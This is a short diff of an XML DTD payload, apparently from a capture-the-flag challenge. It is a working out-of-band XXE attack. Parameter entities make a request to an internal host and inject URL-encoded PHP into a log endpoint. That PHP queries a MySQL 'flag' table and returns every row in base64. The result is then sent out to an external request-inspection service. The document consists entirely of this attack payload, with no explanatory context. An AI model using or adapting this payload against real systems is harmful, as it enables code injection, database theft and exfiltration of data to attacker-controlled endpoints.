@@ -1,4 +1,4 @@
-<!ENTITY % payload SYSTEM "http://172.26.0.4/index.php?file=php://filter/read=convert.base64-encode/resource=dump_lalalalala.sql">
+<!ENTITY % payload SYSTEM "http://172.26.0.4/log_hahahaha.php?auth=emoth&log=%3c%3fphp+%24con+%3d+new+mysqli(%22mysql%22%2c+%22rebirth%22%2c+%22%22%2c+%22flag%22)%3b+if+(%24con-%3econnect_error)+%7becho+%22fail%22%3b%7d+%24sql+%3d+%22SELECT+*+FROM+flag%22%3b+%24result+%3d+%24con-%3equery(%24sql)%3bif+(%24result-%3enum_rows+%3e+0)+%7bwhile(%24row+%3d+%24result-%3efetch_row())+%7becho+base64_encode(%24row%5b0%5d)%3b%7d%7delse+%7becho+%220%22%3b%7d%3b%24con-%3eclose()%3b%3f%3e">
 <!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'https://requestinspector.com/inspect/emoth/%payload;'>">
 %int;
 %trick;
